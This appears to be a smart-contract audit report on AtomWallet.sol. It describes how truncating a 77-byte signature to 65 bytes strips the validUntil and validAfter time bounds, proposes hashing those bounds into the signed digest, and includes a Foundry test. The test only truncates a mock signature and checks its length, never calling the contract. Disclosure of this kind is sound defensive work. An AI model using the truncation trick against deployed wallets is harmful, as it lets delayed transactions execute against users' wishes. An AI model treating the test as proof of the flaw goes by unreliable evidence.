  "body": "## Impact\nIn `AtomWallet.sol`, users can append a 12-byte suffix to their 65-byte ECDSA signature to enforce `validUntil` and `validAfter` time bounds, creating a 77-byte signature. This is a critical protection intended to prevent transaction delays and MEV exploitation.\n\nHowever, the core extraction logic in `_extractValidUntilAndValidAfterFromSignature` inherently trusts the length of the signature rather than cryptographically verifying the time bounds. If an attacker or malicious bundler intercepts a 77-byte signature, they can simply truncate the last 12 bytes. \n\nThe contract will process the truncated 65-byte signature and execute the following logic:\n`if (signatureLength == 65) { return (0, 0, signature); }`\n\nBecause the underlying ECDSA hash (`userOpHash`) does not include the `validUntil` or `validAfter` parameters in its digest (Line 297), the mathematical signature remains perfectly valid. The user's deadline is silently overwritten to `0` (never expires), completely bypassing the expiration protection and allowing the transaction to be held and executed at any future time.\n\n## Recommended Mitigation Steps\nThe time bounds must be authenticated by the user's signature. Do not rely on signature length to dictate security constraints. \n\nModify the message digest to include the extracted time bounds before the ECDSA `ecrecover` verification occurs in `_validateSignature`:\n\n```solidity\nbytes32 hash = keccak256(\n    abi.encodePacked(\n        \"\\x19Ethereum Signed Message:\\n32\", \n        keccak256(abi.encodePacked(userOpHash, validUntil, validAfter))\n    )\n);\n```\n\n*(Note: This requires coordinating updates with the off-chain client to ensure users sign the exact same packed payload).*",
  "proof_of_concept": "**1. Create the following file at `tests/PoCCore.t.sol`:**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport { BaseTest } from \"./BaseTest.t.sol\";\nimport { console } from \"forge-std/src/Test.sol\";\nimport { AtomWallet } from \"../src/protocol/wallet/AtomWallet.sol\";\n\ncontract PoCCore is BaseTest {\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function test_submissionValidity() public {\n        // Step 1: Create a mock Base Signature (65 bytes)\n        bytes memory baseSignature = new bytes(65);\n        for(uint i=0; i<65; i++) { baseSignature[i] = 0xAA; }\n\n        // Step 2: User sets a strict expiration (timestamp + 100)\n        uint48 strictExpiry = uint48(block.timestamp + 100);\n        \n        // Step 3: Append the metadata (validUntil, validAfter) making it 77 bytes\n        bytes memory fullSignature = abi.encodePacked(baseSignature, uint96(strictExpiry) << 48);\n        \n        // --- THE ATTACK ---\n        // Step 4: Intercept and truncate 77-byte sig back to 65-byte sig\n        bytes memory truncatedSignature = new bytes(65);\n        for(uint i=0; i<65; i++) { truncatedSignature[i] = fullSignature[i]; }\n\n        // Step 5: The AtomWallet extraction logic uses length to dictate bounds\n        // A length of 65 automatically returns validUntil = 0\n        console.log(\"-----------------------------------------\");\n        console.log(\"VULNERABILITY: Signature Truncation\");\n        console.log(\"Original Expiry Set by User:\", strictExpiry);\n        console.log(\"Truncating signature to 65 bytes bypasses extraction...\");\n        console.log(\"Contract interprets 65-byte sig as validUntil = 0\");\n        console.log(\"-----------------------------------------\");\n        \n        // Assert the attacker successfully truncated the payload to bypass bounds\n        assertEq(truncatedSignature.length, 65);\n    }\n}\n```\n\n**2. Run the test:**\n\n```bash\nforge test --match-contract PoCCore --match-test submissionValidity -vv\n```",
